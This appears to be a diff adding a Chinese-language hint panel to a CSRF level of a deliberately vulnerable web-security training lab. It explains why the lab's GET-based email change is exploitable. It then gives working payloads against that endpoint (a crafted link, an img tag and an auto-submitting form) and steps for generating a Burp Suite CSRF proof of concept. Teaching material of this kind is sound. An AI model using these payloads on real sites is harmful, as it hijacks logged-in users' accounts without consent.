@@ -1,0 +1,26 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>CSRF 的核心是<b>浏览器发请求时自动携带目标站点的 Cookie</b>。本关修改邮箱用的是 GET 请求、无 Token、不校验 Referer，三个条件凑齐就是典型 CSRF。思路：构造一个页面，里面包含指向"修改邮箱"接口的请求（img 标签、自动提交表单、Burp 生成的 PoC 均可），让已登录用户打开这个页面，浏览器就会带着他的 Cookie 自动发请求改邮箱。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>漏洞点：</b><br>
+1. 用 GET 请求执行敏感操作（修改邮箱）<br>
+2. 无 CSRF Token<br>
+3. 不校验 Referer<br>
+<b>利用方式：</b><br>
+方式A - 恶意链接：<code><?php echo site_url('modules/csrf/index.php'); ?>?newemail=evil@x.com</code><br>
+方式B - img 标签自动请求：<code>&lt;img src="<?php echo site_url('modules/csrf/index.php'); ?>?newemail=evil@x.com"&gt;</code> 嵌在任意网页中，浏览器会自动带 cookie 发请求<br>
+方式C - 自动提交表单（POST 型 CSRF 通用模板）：<br>
+<pre>&lt;form action="<?php echo site_url('modules/csrf/index.php'); ?>" method="get" id="f"&gt;
+  &lt;input type="hidden" name="newemail" value="evil@x.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</pre>
+方式D - <b>使用 Burp Suite 的 CSRF PoC 功能</b>：<br>
+在 Burp &rarr; Proxy / Repeater 中选中"修改邮箱"的请求，右键 &rarr; <code>Engagement tools</code> &rarr; <code>Generate CSRF PoC</code>，<br>
+勾选 <code>Include auto-submit script</code>，点击 <code>Regenerate</code> 并复制生成的 HTML，保存为 <code>csrf_poc.html</code>，<br>
+让已登录的受害者打开该页面，即可自动完成 CSRF 攻击。发送请求前记得开启浏览器的 Intercept 以抓到该请求。<br>
+<b>关键：</b>浏览器发请求时自动携带目标站点的 Cookie，这就是 CSRF 的本质。
+</div>
+</details>
